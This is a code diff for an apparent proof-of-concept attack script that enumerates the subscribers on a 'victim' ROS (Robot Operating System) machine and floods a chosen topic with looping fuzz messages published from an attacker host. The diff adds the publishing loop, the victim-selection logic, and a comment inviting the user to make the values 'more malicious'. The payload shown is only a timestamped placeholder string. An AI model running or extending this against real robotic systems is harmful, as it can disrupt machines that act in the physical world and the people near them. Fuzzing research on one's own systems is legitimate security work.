@@ -46,9 +46,32 @@ ATTACKER_ROS_HOSTNAME = "172.16.88.128"
 #Should we be loud and proud?
 VERBOSE = True
 
-def fuzz():
+def fuzz(target_sub):
     """
-    Pull all subscribers from the victim
+    Starts fuzzing against the given target
+
+    Parameters:
+    --------------
+        * target_sub - Name of the ROS subscriber running on the remote ROS machine
+
+    """
+
+    #Setup the publisher (or talker) -- Tweak these values to be more malicious
+    pub = rospy.Publisher(str(target_sub), String, queue_size=10)
+    rospy.init_node('talker', anonymous=True)
+    rate = rospy.Rate(10) # 10hz
+
+    #Publisher fuzzing loop
+    while not rospy.is_shutdown():
+        #This is where actual fuzzing data will be generated
+        fuzz_str = "FUZZING %s" % rospy.get_time()
+        rospy.loginfo(fuzz_str)
+        pub.publish(fuzz_str)
+        rate.sleep()
+
+def setup():
+    """
+    Pull all subscribers from the victim, and gets ready for fuzzing
 
     """
 
@@ -86,8 +109,13 @@ def fuzz():
     #Are we fuzzing multiple subscribers, if so do it on separate threads
     if str(choice) == "all":
         log("[!] Starting " + str(len(victim_subs)) + " fuzzing threads...")
+        log("[!!] Not yet implemented...")
     else:
         log("[!] Starting fuzzing against " + str(victim_subs[int(choice)]))
+        try:
+            fuzz(str(victim_subs[int(choice)]))
+        except rospy.ROSInterruptException:
+            pass
 
 
 
@@ -107,7 +135,7 @@ def log(text):
 
 def main():
     log("[~] PoC showing Subscriber Fuzzing")
-    fuzz()
+    setup()
 
 
 if __name__ == '__main__':
